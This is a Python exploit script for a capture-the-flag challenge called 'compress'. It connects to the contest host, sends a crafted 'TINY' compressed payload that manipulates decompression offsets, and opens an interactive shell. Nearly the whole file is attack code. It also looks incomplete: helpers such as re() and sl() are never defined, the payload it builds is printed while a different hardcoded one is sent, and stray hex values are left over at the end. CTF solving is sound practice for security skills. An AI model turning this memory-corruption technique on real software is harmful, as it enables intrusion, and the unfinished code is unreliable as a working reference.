#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *
import string
import random
from binascii import hexlify as h

exe = context.binary = ELF('./compress')

host = args.HOST or 'compression.2021.ctfcompetition.com'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x5555555559bb
continue
'''.format(**locals())

# -- Exploit goes here --



def getrstr(l,chrset=string.printable):
    s = ""
    while len(s) != l:
        s += random.choice(chrset)
    return s.encode('latin1')

def getb(val): # 64 bit val
    t = val
    i = 0
    r = []
    while t:
        b = ((val >> (i * 7)) & 0x7f) | 0x80
        r.append(b)
        i += 1
        t >>= 7
    return bytearray(r)

def hexy(a):
    return h(bytearray(a))


def decompress(code):
    re()
    sl("2")
    re()
    sl(code)

io = start()
exploit = b"TINY"
exploit += getrstr(1) + b"\xff" # set offset1
exploit += getb(0x2) + b"\x00" # set offset2 len of pattern unit
exploit += getb(0x1) + b"\x00" # set v15 len of pattern
exploit += b"\xff\xff"
code = (hexy(exploit).decode('latin1'))
print(code)
decompress("54494e59ffffffffffff2fffffffffffffffffffffffffffffffff492d2f")
io.interactive()

"""
0xfdfe7dfdfdfdcb7f
0xfdfe7dfdfdfdcb7f
0xfdfe7dfdfdfdcb7f
0xf0f170f0fdfdcb7f
"""